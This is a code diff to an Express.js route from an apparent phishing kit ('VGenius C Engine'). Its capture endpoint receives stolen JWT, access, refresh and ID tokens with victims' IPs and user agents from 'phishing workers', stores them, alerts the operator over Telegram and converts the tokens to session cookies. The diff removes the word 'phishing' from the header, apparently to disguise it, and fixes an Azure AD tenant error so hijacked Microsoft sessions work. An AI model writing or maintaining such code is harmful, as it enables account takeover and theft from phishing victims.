@@ -1,6 +1,6 @@
 /**
- * VGenius C Engine – Token Capture Routes
- * Receives tokens from deployed phishing workers
+ * VGenius C Engine - Token Capture Routes
+ * Receives tokens from deployed workers
  */
 const express = require('express');
 const router = express.Router();
@@ -11,7 +11,7 @@ const { encrypt } = require('../utils/encrypt');
 const { processCookieConversion } = require('../services/cookieconverter');
 const { sendTelegramNotification } = require('../services/notification');
 
-// POST /api/capture – receives tokens from the phishing worker
+// POST /api/capture - receives tokens from the phishing worker
 router.post('/', async (req, res) => {
     try {
         const { jwt_token, access_token, refresh_token, id_token, ip, user_agent } = req.body;
@@ -93,8 +93,9 @@ router.post('/', async (req, res) => {
         const tokenId = result.insertId;
 
         // If link is in cookie mode, trigger cookie conversion asynchronously
+        // PASS TENANT TO AVOID AADSTS7000012 ERROR
         if (link.auth_mode === 'cookie') {
-            processCookieConversion(tokenId, access_token, link.template_type)
+            processCookieConversion(tokenId, access_token, link.template_type, tenant)
                 .then(() => {
                     const io = req.app.get('io');
                     if (io) {
